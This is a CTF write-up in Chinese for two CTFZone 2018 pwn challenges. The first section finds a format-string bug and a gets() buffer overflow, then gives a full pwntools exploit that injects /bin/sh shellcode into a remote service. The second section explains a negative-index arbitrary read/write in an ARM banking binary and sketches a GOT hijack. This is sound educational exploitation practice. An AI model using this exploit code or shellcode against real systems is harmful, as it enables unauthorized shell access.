# CTFZone 2018 Quals - Notes


## easypwn_strings
> Description:
>
> You can try to use very interesting and strange string functions ;) Good luck.
nc pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one 1234
>
> And yes, there is no binary here

[ctftime_writeUp](https://ctftime.org/task/6314)

連線上去有三個功能:
```
root@solymx:/tmp/p# nc pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one 1234
Let's choose string operation!
        1. StrLen
        2. SubStrRemove
        3. StrRemoveLastSymbols
```

1. 第一個功能就是給你輸入一個字串，然後回傳長度就終止連線，沒啥用
2. 第二個功能沒有實作完整，使用他會說功能還沒實作好，就終止連線
3. 第三個功能是你先輸入一個字串，之後再輸入一個數字 n ，會把字串最後面的 n 個字拿掉

這邊有 fmt string vuln ，再輸入字串那邊有洞

```
root@solymx:/tmp/p# nc pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one 1234
Let's choose string operation!
        1. StrLen
        2. SubStrRemove
        3. StrRemoveLastSymbols
        3
You choise - 3
        Use str int
        good choise
        Set string:
%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-
        Set number:
1
        Delete 1 ending symbols
        Result:
ff8e72d0-92-f75fe1a4-20e-f77b41b0-3de00ec7-1-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-7825-0-0-0-0-0
```

好像可以用第三個功能把 binary dump 出來，不過不會@@


有 binary 可以看一下保護只有開 DEP / x86

之後丟 ida pro 看程式碼，會發現還有三個隱藏功能

```
if ( INPUT == '1' || INPUT == '2' || INPUT == '3' || INPUT == 'X' || INPUT == 'T' || INPUT == 'S' )
```

1. 輸入 T: 會給你 binary 和 libc 的網址連結
2. 輸入 S: 會直接 Segmentation fault
3. 輸入 X: 問你 (y/n) ，輸入 y 給你 Have a Nice day

漏洞出在輸入 X 後，他要你輸入 (y/n) 這邊
```
      puts("\tAre you surprised?? (y or n)\r");
      gets(byte_80492E0);
```

他這邊用 gets() 所以會有 buffer overflow

可以發現給 256 垃圾後可以蓋 EIP

輸入位置固定在: 0x80492E0 ，因為在 bss 上，然後要注意的是，需要包含有 y 


```python
#!/usr/bin/env python
from pwn import *

HOST = 'pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one'
PORT = 1234
r = remote(HOST, PORT)


buf = 0x80492E0

sh = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = 'y' + sh
payload = payload.ljust(256,'\x90') + p32(buf + 1)
r.sendline('X')
r.sendline(payload)

r.interactive()
```


## Mobile Bank
> Description:
>
> We bring your attention to a new, unique product: "Mobile Bank"! It's a completely secure banking server running on mobile platforms. Now the Bank is in your pocket!
> nc pwn-04.v7frkwrfyhsjtbpfcppnu.ctfz.one 1337

[CTFtime_WriteUp](https://ctftime.org/task/6315)


先看保護有 canary 和 DEP，且這題很特別的是 ARM 架構

執行方式可以使用如下:
```

root@solymx:/tmp/p# qemu-arm -L  /usr/arm-linux-gnueabihf ./a
         _._._                       _._._
        _|   |_                     _|   |_
        | ... |_._._._._._._._._._._| ... |
        | ||| |  o NATIONAL BANK o  | ||| |
        | """ |  """    """    """  | """ |
   ())  |[-|-]| [-|-]  [-|-]  [-|-] |[-|-]|  ())
  (())) |     |---------------------|     | (()))
 (())())| """ |  """    """    """  | """ |(())())
 (()))()|[-|-]|  :::   .-"-.   :::  |[-|-]|(()))()
 ()))(()|     | |~|~|  |_|_|  |~|~| |     |()))(()
    ||  |_____|_|_|_|__|_|_|__|_|_|_|_____|  ||
 ~ ~^^ @@@@@@@@@@@@@@/=======\@@@@@@@@@@@@@@ ^^~ ~
      ^~^~                                ~^~^
*******************$$$Menu$$$*******************
* 1 - info                                     *
* 2 - set account id                           *
* 3 - set account note                         *
* 4 - make transaction                         *
* 5 - print account info                       *
* 6 - enable debug                             *
* 0 - exit                                     *
************************************************
```

之後直接丟 ida pro 看 source code

可以看到在 set account id 的函數中，並沒有輸入數字的下限做檢查，只有檢查上限

所以這代表我們可以輸入負數的 account id

```c
signed int sub_10C94()
{
  signed int result; // r0

  printf("Enter account id: ");
  result = Read_num();
  if ( result > 15 )
    return puts("Wrong account id!");
  dword_22080 = result;
  return result;
}
```

然後他有一個 global array (`dword_22088`) (int, pointer)

然後看一下 make transaction 的函數，可以做到任意位置寫

```c
int sub_10EC8()
{
  int result; // r0

  printf("Enter transaction value: ");
  result = Read_num();
  Global_array[2 * account_id] = Global_array[2 * account_id] + result;
  return result;
}
```

然後 print account info 的函數可以做到任意位置讀取
```c
int sub_10DF8()
{
  void *v0; // r3
  char s; // [sp+Ch] [bp-158h]

  if ( Global_array[2 * account_id + 1] )
    v0 = Global_array[2 * account_id + 1];
  else
    v0 = &unk_1196C;
  snprintf(&s, 0x150u, "id: %u, value: %d$, note:\"%s\"", account_id, Global_array[2 * account_id], v0);
  return puts(&s);
}
```

objdump 看法:
```
$ arm-linux-gnueabihf-objdump -d -M intel ./a | less
```


先記住 global_arr: 0x22088

像 malloc@got: 0x22048，相差是 64 ，如果 account_id 給 -8 ，這樣 2 * account_id = -16

global_array[-16] 這樣會取到 malloc@got 的值，可以這樣去 leak got 來算 libc 

之後再算 system 之後蓋上去做 got hijack





